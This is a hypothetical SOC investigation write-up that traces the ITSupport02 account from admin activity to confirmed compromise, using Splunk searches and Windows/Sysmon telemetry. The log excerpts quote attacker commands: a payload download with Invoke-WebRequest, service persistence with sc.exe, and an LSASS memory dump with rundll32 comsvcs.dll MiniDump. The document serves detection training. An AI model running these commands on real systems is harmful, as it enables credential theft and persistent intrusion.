# Splunk SOC Investigation — ITSupport02: From Legitimate Administration to Confirmed Compromise

## Overview

This hypothetical SOC investigation examines activity involving `ITSupport02` across `CLIENT60`, `CLIENT61`, `DC01`, and `FILESERVER02`.

The exercise is designed around an important SOC challenge: **legitimate administrative activity can closely resemble attacker behavior**. The investigation therefore begins without assuming compromise and progressively evaluates the evidence until the activity crosses the threshold for incident declaration.

The key investigative question is:

> **At what point does legitimate IT administration end and attacker behavior begin?**

---

# Investigation Environment

| Host           | Role                        |
| -------------- | --------------------------- |
| `CLIENT60`     | IT Support workstation      |
| `CLIENT61`     | Remote endpoint             |
| `DC01`         | Domain Controller           |
| `FILESERVER02` | File server                 |
| `ITSupport02`  | Account under investigation |

---

# Telemetry Under Investigation

The following is the complete telemetry available to the analyst.

```text
08:41:12 — CLIENT60
4624

Account: ITSupport02
Logon Type: 2
```

```text
08:42:03 — CLIENT60
4104

Get-Service
```

```text
08:42:17 — CLIENT60
4104

Get-Process
```

```text
08:43:02 — CLIENT60
4104

Get-ADComputer -Filter *
```

```text
08:44:11 — CLIENT60
4688

powershell.exe

Enter-PSSession -ComputerName CLIENT61
```

```text
08:44:15 — CLIENT61
4624

Account: ITSupport02
Logon Type: 3
Source: CLIENT60
```

```text
08:44:32 — CLIENT61
4104

Get-Service
```

```text
08:44:51 — CLIENT61
4104

Get-ADGroupMember "Domain Admins"
```

```text
08:45:13 — DC01
4769

Account: ITSupport02
Service:

cifs/FILESERVER02
```

```text
08:45:22 — FILESERVER02
4624

Account: ITSupport02
Logon Type: 3
Source: CLIENT61
```

```text
08:45:39 — FILESERVER02
4663

Object:

\\FILESERVER02\IT\DeploymentPackages.zip

Access:

ReadData
```

```text
08:46:08 — CLIENT61
4104

Invoke-WebRequest
https://updates-example.net/support.zip
-OutFile C:\ProgramData\support.zip
```

```text
08:46:19 — CLIENT61
Sysmon Event ID 11

File Created:

C:\ProgramData\support.zip
```

```text
08:46:51 — CLIENT61
4688

7z.exe

7z.exe x C:\ProgramData\support.zip
-oC:\ProgramData\Support
```

```text
08:47:04 — CLIENT61
Sysmon Event ID 1

Process:

supportsvc.exe

Parent:

7z.exe
```

```text
08:47:09 — CLIENT61
Sysmon Event ID 3

supportsvc.exe
        ↓
185.220.101.44
        ↓
443
```

```text
08:47:31 — CLIENT61
4688

sc.exe create WindowsSupport
binPath= C:\ProgramData\Support\supportsvc.exe
```

```text
08:47:46 — CLIENT61
7045

Service Name:

WindowsSupport

Image Path:

C:\ProgramData\Support\supportsvc.exe
```

```text
08:48:20 — CLIENT61
4688

rundll32.exe

comsvcs.dll, MiniDump 612
C:\ProgramData\lsass.dmp full
```

```text
08:48:39 — CLIENT61
Sysmon Event ID 11

File Created:

C:\ProgramData\lsass.dmp
```

---

# 1. Where Does Legitimate Activity End?

I would place the **last potentially legitimate activity** around:

```text
08:45:39 — FILESERVER02
4663

\\FILESERVER02\IT\DeploymentPackages.zip

ReadData
```

There is a plausible administrative explanation for the activity before this point.

`ITSupport02` logs onto `CLIENT60`, performs basic system discovery, enumerates computers in Active Directory, and remotely connects to `CLIENT61`.

That could represent normal IT support activity.

Even the access to:

```text
\\FILESERVER02\IT\DeploymentPackages.zip
```

could be legitimate if the IT team uses a centralized deployment package repository.

However, the investigation becomes substantially more suspicious once an external archive is downloaded directly to `CLIENT61`.

---

# 2. First Point of Suspicion

My first significant suspicion is:

```text
08:44:51 — CLIENT61
4104

Get-ADGroupMember "Domain Admins"
```

The command itself is not malicious.

However, the **context** makes it suspicious.

The sequence is:

```text
ITSupport02
      ↓
CLIENT60
      ↓
AD computer discovery
      ↓
CLIENT61
      ↓
Domain Admin enumeration
```

A Helpdesk or IT support administrator could legitimately perform this type of discovery, so I would initially classify this as:

> **Suspicious — requiring further investigation.**

I would not declare an incident at this point.

The subsequent activity is what determines whether the suspicion develops into a confirmed security incident.

---

# 3. Incident Declaration

I would declare the incident at:

```text
08:47:09 — CLIENT61

supportsvc.exe
        ↓
185.220.101.44
        ↓
443
```

At this point, the telemetry shows a compelling attack sequence:

```text
External archive downloaded
        ↓
Archive extracted
        ↓
supportsvc.exe executed
        ↓
supportsvc.exe communicates externally
```

The situation becomes even more serious because the destination IP has reportedly been identified through threat intelligence as malicious infrastructure.

However, I would be precise in the report:

> The malicious reputation of the IP is a strong corroborating indicator, but the strongest evidence comes from the **entire correlated sequence**, rather than the IP reputation alone.

I would then escalate immediately when the service persistence and LSASS dump appear.

In particular:

```text
08:47:46
7045
WindowsSupport
```

followed by:

```text
08:48:20
rundll32.exe
comsvcs.dll, MiniDump
```

provides extremely strong evidence of malicious post-compromise activity.

---

# 4. Is ITSupport02 → CLIENT61 Automatically Malicious?

**No.**

This is an important distinction.

The following sequence is entirely capable of representing legitimate IT administration:

```text
CLIENT60
    ↓
PowerShell
    ↓
Enter-PSSession CLIENT61
    ↓
4624 Type 3
    ↓
Get-Service
```

IT support personnel commonly use remote PowerShell sessions to:

* Troubleshoot systems
* Inspect services
* Review running processes
* Install software
* Perform maintenance
* Respond to support requests

Therefore, I would not classify the remote session itself as malicious.

The risk changes because the activity subsequently progresses from administration into:

```text
AD privileged-account discovery
        ↓
External download
        ↓
Payload execution
        ↓
External communication
        ↓
Service persistence
        ↓
LSASS memory dumping
```

That progression is inconsistent with ordinary troubleshooting unless there is compelling organizational evidence explaining every step.

---

# 5. Reconstructed Attack Chain

The complete sequence can be reconstructed as follows:

```text
ITSupport02
      ↓
CLIENT60
      ↓
Interactive Logon
4624 Type 2
      ↓
Get-Service
Get-Process
      ↓
Get-ADComputer -Filter *
      ↓
PowerShell Remoting
Enter-PSSession CLIENT61
      ↓
CLIENT61
4624 Type 3
      ↓
Get-Service
      ↓
Get-ADGroupMember "Domain Admins"
      ↓
DC01
4769
CIFS/FILESERVER02
      ↓
FILESERVER02
4624 Type 3
      ↓
DeploymentPackages.zip
ReadData
      ↓
CLIENT61
Invoke-WebRequest
support.zip
      ↓
C:\ProgramData\support.zip
      ↓
7z.exe
      ↓
supportsvc.exe
      ↓
185.220.101.44:443
      ↓
WindowsSupport Service
7045
      ↓
LSASS Memory Dump
      ↓
C:\ProgramData\lsass.dmp
```

The attack progression can therefore be interpreted as:

### Stage 1 — Discovery

```text
Get-Service
Get-Process
Get-ADComputer
Get-ADGroupMember "Domain Admins"
```

### Stage 2 — Remote Access

```text
CLIENT60
    ↓
CLIENT61
```

### Stage 3 — Payload Delivery

```text
Invoke-WebRequest
        ↓
support.zip
```

### Stage 4 — Execution

```text
7z.exe
    ↓
supportsvc.exe
```

### Stage 5 — Command and Control

```text
supportsvc.exe
    ↓
185.220.101.44:443
```

### Stage 6 — Persistence

```text
sc.exe create WindowsSupport
        ↓
7045
        ↓
supportsvc.exe
```

### Stage 7 — Credential Access

```text
rundll32.exe
        ↓
comsvcs.dll
        ↓
LSASS
        ↓
lsass.dmp
```

---

# 6. Primary and Potentially Affected Hosts

## Primary affected host — CLIENT61

`CLIENT61` is the primary affected host because it contains the strongest evidence of compromise:

* Payload download
* Archive extraction
* Suspicious executable execution
* External network communication
* Service creation
* LSASS memory dumping

This host should receive immediate containment priority.

## Potentially affected — CLIENT60

`CLIENT60` is potentially affected because:

* It is the origin of the remote session.
* `ITSupport02` authenticated interactively there.
* The account performed the initial discovery.

However, the available telemetry does **not** prove that `CLIENT60` itself is compromised.

## Potentially affected — FILESERVER02

`FILESERVER02` is also in scope because `ITSupport02` accessed:

```text
\\FILESERVER02\IT\DeploymentPackages.zip
```

The current evidence only shows `ReadData`.

There is not enough evidence to conclude that the server itself is compromised.

## DC01

`DC01` is an important investigative system because it records the Kerberos service-ticket activity, but the provided telemetry does not demonstrate compromise of the domain controller.

---

# 7. First Splunk Search

I would begin by searching around the suspicious account and the known indicators:

```spl
index=wineventlog OR index=sysmon
("ITSupport02" OR "supportsvc.exe" OR "185.220.101.44")
| table _time host EventCode Account_Name User Image CommandLine ParentImage DestinationIp DestinationPort
| sort _time
```

The objective is to establish the broader activity surrounding the account, endpoint, payload, and network destination.

I would then narrow the search around `CLIENT61`:

```spl
index=wineventlog OR index=sysmon
host=CLIENT61
earliest=-2h latest=+2h
| table _time EventCode Image ParentImage CommandLine User DestinationIp DestinationPort
| sort _time
```

This would help establish what happened before and after the observed attack chain.

---

# 8. Identifiers for Reconstructing the Process Chain

The primary correlation identifiers I would use are:

### LogonGUID

Useful for answering:

> Which activity belongs to the same authentication session?

### ProcessGUID

Useful for answering:

> Which process generated or spawned this activity?

### Account

```text
ITSupport02
```

Useful for tracking authentication and activity across hosts.

### Source and destination hosts

```text
CLIENT60
      ↓
CLIENT61
      ↓
FILESERVER02
```

Useful for reconstructing movement through the environment.

### Time

Timeline correlation is critical because the events occur only seconds apart.

For example:

```text
08:46:08  Download
08:46:19  File creation
08:46:51  Extraction
08:47:04  Execution
08:47:09  Network connection
08:47:31  Service creation
08:47:46  Service installation
08:48:20  LSASS dump
```

That temporal relationship is itself a major investigative signal.

---

# 9. Additional Telemetry

I would immediately investigate:

### Authentication

**4624 / 4625**

To determine whether `ITSupport02` authenticated elsewhere unexpectedly.

### Privileged Logons

**4672**

To determine whether the account received special privileges on `CLIENT61` or other systems.

### Process Creation

**4688 / Sysmon Event ID 1**

To reconstruct:

```text
PowerShell
   ↓
7z.exe
   ↓
supportsvc.exe
   ↓
rundll32.exe
```

### Network Connections

**Sysmon Event ID 3**

To determine whether:

* `CLIENT61` contacted other external destinations
* `supportsvc.exe` communicated elsewhere
* Other processes communicated with the same infrastructure

### DNS

DNS telemetry could establish how:

```text
updates-example.net
```

resolved and whether other endpoints contacted the same infrastructure.

### File Creation

**Sysmon Event ID 11**

I would investigate files created by:

* PowerShell
* `7z.exe`
* `supportsvc.exe`
* `rundll32.exe`

### Service Creation

**7045**

This is particularly important because:

```text
WindowsSupport
```

was created to execute the suspicious payload.

### EDR

EDR telemetry could provide the complete process tree, file reputation, hash, command line, network behavior, and potentially prevention/detection events.

---

# 10. Containment

My first containment action would be:

## Isolate CLIENT61

This is the highest-priority host because it has demonstrated:

```text
Payload execution
        ↓
External communication
        ↓
Persistence
        ↓
Credential dumping
```

Network isolation limits the attacker's ability to:

* Establish further command and control
* Move laterally
* Access additional systems
* Reuse stolen credentials

I would then investigate and potentially disable or restrict `ITSupport02`, particularly if evidence indicates credential compromise.

I would also:

1. Revoke active sessions.
2. Reset the account credentials.
3. Investigate other systems accessed by the account.
4. Preserve relevant forensic evidence.
5. Investigate `CLIENT60`.
6. Review `FILESERVER02` access.
7. Hunt for the malicious IP and payload hash across the environment.

I would avoid immediately wiping the host because preservation of evidence is important for understanding the compromise.

---

# 11. What Could Prove This Was Legitimate IT Administration?

This is where the investigation needs to remain objective.

Evidence supporting legitimate activity could include:

### IT Change / Service Ticket

A ticket explicitly authorizing:

```text
ITSupport02
→ CLIENT61
→ software installation/update
```

would provide important context.

### Approved Software

If `support.zip` and `supportsvc.exe` belong to an approved IT support application, suspicion would decrease substantially.

### Known-Good Hash

The SHA256 hash of:

```text
supportsvc.exe
```

could be compared against the organization's approved software inventory.

### Digital Signature

A valid signature from the expected vendor would provide additional evidence.

### Approved Infrastructure

The destination:

```text
185.220.101.44:443
```

would need to be verified against known corporate infrastructure.

However, there is an important limitation:

> **If the destination is independently confirmed to be malicious infrastructure and `supportsvc.exe` is also confirmed malicious, a legitimate IT ticket would not make the overall sequence benign.**

It could instead indicate:

* An abused legitimate account
* A compromised IT workstation
* A malicious package disguised as legitimate software
* An attacker operating through legitimate administrative procedures

This is why validation must combine **business context + endpoint evidence + network evidence + threat intelligence**.

---

# Final SOC Assessment

The investigation begins with activity that could reasonably belong to an IT administrator:

```text
ITSupport02
     ↓
CLIENT60
     ↓
System discovery
     ↓
AD computer discovery
     ↓
PowerShell Remoting
     ↓
CLIENT61
```

The first meaningful suspicion arises when the account enumerates:

```text
Get-ADGroupMember "Domain Admins"
```

However, this remains **suspicious rather than confirmed malicious**.

The investigation changes dramatically when:

```text
Invoke-WebRequest
       ↓
support.zip
       ↓
supportsvc.exe
       ↓
185.220.101.44:443
       ↓
WindowsSupport service
       ↓
LSASS memory dump
```

appears within a short time window.

At that point, the telemetry is no longer consistent with ordinary Helpdesk administration without substantial additional evidence.

## Key Lesson

The most important lesson from this exercise is that **SOC analysts should not declare an incident simply because an administrator performs administrative-looking actions**.

Instead, the analyst should continuously ask:

> **Does the activity make sense for this account, this host, this time, and this business function?**

In this case, the answer changes as the investigation progresses.

The early activity may be legitimate.

The later correlated behavior provides strong evidence of compromise.

---

## Skills Practiced

`Splunk` · `SPL` · `Windows Event Logs` · `PowerShell` · `Sysmon` · `Active Directory` · `Kerberos` · `Process Correlation` · `Network Analysis` · `Threat Hunting` · `Persistence Detection` · `Credential Access` · `Incident Response`

---

## Author

**Precious Anyanwu**

Cybersecurity | SOC Analysis | Cloud Security | Threat Detection
